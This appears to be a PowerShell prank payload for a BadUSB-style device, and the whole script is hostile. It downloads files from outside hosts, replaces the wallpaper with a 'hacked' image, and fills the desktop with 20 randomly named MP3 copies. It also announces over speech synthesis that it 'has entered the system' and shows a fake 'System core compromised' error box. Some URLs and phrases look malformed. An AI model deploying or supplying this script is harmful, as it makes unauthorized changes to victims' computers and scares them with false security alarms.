# Links and dirs
$wallpaperUrl = "https://i.pinimg.com/originals/e4/7e/6a/e47e6a7c3666666e6e6a6a6a6a6a6a.jpg" 
$audioUrl = "https://raw.githubusercontent.com/HarounGaidaESP32-Deauther/main/payloads/laugh.mp3"
$desktopPath = [Environment]::GetFolderPath("Desktop")
$tempPath = "$env:TEMP\CyberCarCar_assets"
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath }

# Wallpaper change
$imgFile = "$tempPath\hacked.jpg"
(New-Object System.Net.WebClient).DownloadFile($wallpaperUrl, $imgFile)

$code = @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
Add-Type -TypeDefinition $code
[Wallpaper]::SystemParametersInfo(20, 0, $imgFile, 3)


$mp3File = "$tempPath\laugh.mp3"
Invoke-WebRequest -Uri $audioUrl -OutFile $mp3File

for ($i = 1; $i -le 20; $i++) {
    $randomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % { [char]$_ })
    Copy-Item $mp3File -Destination "$desktopPath\$randomName.mp3"
}

# Talk
$voice = New-Object -ComObject SAPI.SpVoice
$voice.Speak("CyberCarCar has entered the system. Your desktop belongs CyberCarberCar now.")

# Fake 
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("CRITICAL ERROR: System core compromised. Initiating laugh.exe", "Project CyberCarCar")


exit
